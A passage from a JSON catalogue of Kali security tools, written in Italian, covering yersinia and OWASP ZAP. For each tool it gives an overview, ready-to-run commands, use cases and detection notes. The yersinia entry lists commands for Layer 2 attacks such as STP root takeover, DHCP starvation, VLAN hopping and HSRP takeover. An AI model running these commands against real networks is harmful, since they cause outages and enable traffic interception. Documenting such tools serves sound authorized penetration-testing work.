condividere signature di detection con la community attraverso repository come YARA-Rules, enabling difesa collaborativa contro threat emergenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> YARA è un tool di analisi locale che non genera traffico di rete durante la scansione. Le regole possono essere condivise pubblicamente per detection collaborativa ma attenzione a non rivelare indicatori sensibili. Performance dipende da complessità delle regole e volume di file - ottimizzare regole per ambiente production. Considerare implicazioni privacy quando si scansionano sistemi di terze parti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "yersinia",
    "name": "yersinia",
    "version": "0.8.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/yersinia/",
    "desc": "Attacchi layer 2: STP, CDP, DTP, DHCP, 802.1Q per VLAN hopping e network takeover.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Yersinia</strong> è un framework specializzato per attacchi Layer 2 che sfrutta debolezze intrinseche nei protocolli di rete a livello data link. Supporta attacchi completi su STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP (Hot Standby Router Protocol), 802.1Q, VTP e altri protocolli per VLAN hopping, network takeover, MITM e denial of service. È uno strumento essenziale per network penetration testing che evidenzia vulnerabilità spesso ignorate nelle configurazioni switch.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>STP Root Bridge Attack:</strong> invia BPDU con priority inferiore per diventare root bridge della rete, causando ricalcolo della topologia e permettendo intercettazione di tutto il traffico switched che ora transita attraverso l'attaccante.</p><p><strong>DTP Trunk Negotiation:</strong> negozia automaticamente una connessione trunk con switch Cisco configurati in modalità dynamic, ottenendo accesso a tutte le VLAN configurate e bypassando la segmentazione di rete.</p><p><strong>DHCP Starvation &amp; Rogue Server:</strong> esaurisce il pool di indirizzi DHCP legittimo tramite flood di DHCP Discover, poi risponde come rogue DHCP server per assegnare gateway malevolo e intercettare traffico client.</p><p><strong>CDP/LLDP Discovery &amp; Spoofing:</strong> cattura informazioni di discovery per mappare topologia di rete, poi esegue spoofing per impersonare dispositivi o flooding per causare DoS su switch vulnerabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI interattiva ncurses\nyersinia -I\n\n# Avvia GUI GTK (se disponibile)\nyersinia -G\n\n# STP root bridge attack da CLI\nyersinia stp -attack 1 -interface eth0\n\n# DHCP starvation (esaurimento pool)\nyersinia dhcp -attack 1 -interface eth0\n\n# DTP trunk negotiation attack\nyersinia dtp -attack 1 -interface eth0\n\n# CDP flooding attack\nyersinia cdp -attack 1 -interface eth0\n\n# HSRP takeover (become active router)\nyersinia hsrp -attack 1 -interface eth0\n\n# 802.1Q double tagging VLAN hopping\nyersinia 8021q -attack 1 -interface eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Infrastructure Pentesting</strong>, testare la sicurezza delle configurazioni switch e la resistenza della rete ad attacchi Layer 2, identificando misconfiguration comuni come DTP enabled e STP non protetto.</p><p>Per <strong>VLAN Segmentation Bypass</strong>, verificare l'efficacia della segmentazione VLAN tentando VLAN hopping via DTP trunk negotiation o 802.1Q double tagging.</p><p>Per <strong>Network MITM Positioning</strong>, ottenere posizione man-in-the-middle diventando root bridge STP o rogue DHCP/gateway per intercettare traffico di rete.</p><p>Per <strong>Redundancy Protocol Testing</strong>, testare sicurezza di protocolli di ridondanza come HSRP, VRRP verificando possibilità di takeover del gateway attivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attacchi Layer 2 causano anomalie immediate facilmente rilevabili da network monitoring e SIEM. STP topology change genera log e alert su tutti gli switch managed. DHCP starvation è estremamente visibile nei log DHCP server. CDP/LLDP flooding può causare crash di switch vulnerabili. CRITICO: questi attacchi possono causare disruption di rete significativa e outage - usare solo in ambiente di test isolato o con autorizzazione esplicita e finestre di manutenzione concordate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "zaproxy",
    "name": "zaproxy",
    "version": "2.16.1",
    "icon": "../app/icons/zaproxy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/zaproxy/",
    "desc": "OWASP ZAP: proxy intercettante, scanner vulnerabilità web, fuzzer e spider automatico.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OWASP ZAP (Zed Attack Proxy) è uno degli scanner di sicurezza web open source più popolari e completi al mondo, mantenuto da OWASP Foundation. Combina proxy intercettante avanzato, scanner automatico di vulnerabilità con detection per OWASP Top 10, fuzzer potente, spider intelligente, API REST completa e sistema di plugin estensibile. È lo strumento di riferimento per web application security testing sia manuale che automatizzato, utilizzato da penetration tester, sviluppatori e team DevSecOps.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intercepting Proxy:</strong> cattura e modifica request/response HTTP/HTTPS in tempo reale con supporto WebSocket, breakpoint condizionali, replay di request e history searchable per analisi manuale approfondita del traffico applicativo.</p><p><strong>Active &amp; Passive Scanner:</strong> identifica vulnerabilità automaticamente attraverso scanning passivo (analisi del traffico) e attivo (injection di payload). Rileva SQL injection, XSS, path traversal, CSRF, security misconfiguration e tutte le vulnerabilità OWASP Top 10.</p><p><strong>Intelligent Spider:</strong> crawling automatico avanzato con supporto JavaScript rendering, form submission, session handling e AJAX spider per mappare completamente applicazioni web moderne incluse SPA React/Angular/Vue.</p><p><strong>Advanced Fuzzer:</strong> testing con payload custom su qualsiasi parte della request (parametri, header, body, path) con supporto per file di payload, generatori e encoding automatico per vulnerability discovery.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia ZAP GUI\nzaproxy\n\n# Quick scan completo da CLI\nzap-cli quick-scan -s all -r https://target.com\n\n# Spider dell'applicazione\nzap-cli spider https://target.com\n\n# Active scan dopo spider\nzap-cli active-scan https://target.com\n\n# Genera report HTML\nzap-cli report -o report.html -f html\n\n# Headless mode per CI/CD\nzap.sh -daemon -port 8080 -config api.disablekey=true\n\n# Scan con autenticazione\nzap-cli --zap-url http://127.0.0.1:8080 active-scan -c auth_context https://target.com\n\n# API scan per OpenAPI/Swagger\nzap-api-scan.py -t https://target.com/api/openapi.json -f openapi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Pentesting</strong>, condurre assessment completo di sicurezza su applicazioni web identificando vulnerabilità OWASP Top 10, business logic flaw e misconfiguration.</p><p>Per <strong>DevSecOps CI/CD Integration</strong>, integrare scanning automatico nelle pipeline di sviluppo con ZAP in modalità daemon, API REST e plugin per Jenkins, GitLab CI, GitHub Actions.</p><p>Per <strong>Manual Security Testing</strong>, utilizzare il proxy intercettante per analisi dettagliata di funzionalità specifiche, testing di autenticazione, authorization bypass e session management.</p><p>Per <strong>API Security Testing</strong>, testare sicurezza di REST API importando specifiche OpenAPI/Swagger per coverage automatica degli endpoint.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> active scan genera traffico con pattern di attacco evidenti facilmente identificabili da WAF e IDS. Lo spider può triggare rate limiting e generare alert per accesso anomalo. Request con payload di injection sono loggate. Usare passive scan e spider delicato per ridurre rumore durante reconnaissance, riservando active scan per finestre concordate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  }
]
